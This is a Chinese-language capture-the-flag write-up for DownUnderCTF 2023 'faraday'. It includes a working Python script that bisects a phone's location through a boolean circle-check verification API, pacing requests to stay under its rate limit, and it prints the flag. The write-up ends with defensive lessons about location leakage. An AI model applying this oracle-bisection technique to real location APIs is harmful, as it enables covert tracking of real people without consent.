# DownUnderCTF 2023 faraday Writeup

## 题目简述

题目给出目标电话号码，并提供一个位置验证 API。调用者不能直接读取坐标，只能提交圆心和半径，询问设备是否位于圆内；半径限制为 2 km 到 200 km，且每分钟最多 10 次请求。目标是用布尔圆形 oracle 缩小位置，再确定维多利亚州城镇名称。

## 解题过程

从维多利亚州中心附近开始，先用 200 km 半径确认目标在搜索范围内。每轮对当前圆心及其八个相邻偏移点发起查询，选取返回 `TRUE` 的圆心，然后把半径除以 1.5。经纬度偏移可按局部近似换算：纬度每度约 111111 米，经度还需除以 $\cos(\text{latitude})$。

```python
import math
import time
import requests

BASE_URL = "http://host:port"
PHONE = "0491578888"

def offset(latitude, longitude, east_m, north_m):
    return (
        latitude + north_m / 111111,
        longitude + east_m / (111111 * math.cos(math.radians(latitude))),
    )

def contains(latitude, longitude, radius):
    body = {
        "device": {"phoneNumber": PHONE},
        "area": {
            "areaType": "Circle",
            "center": {"latitude": latitude, "longitude": longitude},
            "radius": radius,
        },
        "maxAge": 120,
    }
    response = requests.post(f"{BASE_URL}/verify", json=body, timeout=10)
    time.sleep(6.2)  # 保持在每分钟 10 次以内
    return response.json()["verificationResult"] == "TRUE"

center = (-36.787728, 144.689149)
radius = 200000

while radius >= 2000:
    candidates = [
        offset(*center, east, north)
        for north in (-radius / 2, 0, radius / 2)
        for east in (-radius / 2, 0, radius / 2)
    ]
    center = next(point for point in candidates if contains(*point, radius))
    radius = int(radius / 1.5)
    print(center, radius)
```

搜索最终收敛到约 `-36.45, 146.43`。把坐标与维多利亚州城镇边界、道路和地名交叉核对，目标位于 Milawa。按全小写、无空格格式提交：

```text
DUCTF{milawa}
```

## 方法总结

布尔位置验证仍会泄漏位置。即使 API 只回答“是否在圆内”，攻击者也能通过自适应缩小圆半径进行空间二分；2 km 的最小半径已经足以确定乡镇。真实系统需要授权、查询预算、审计和更粗粒度的隐私保护，而不仅是限制直接返回坐标。
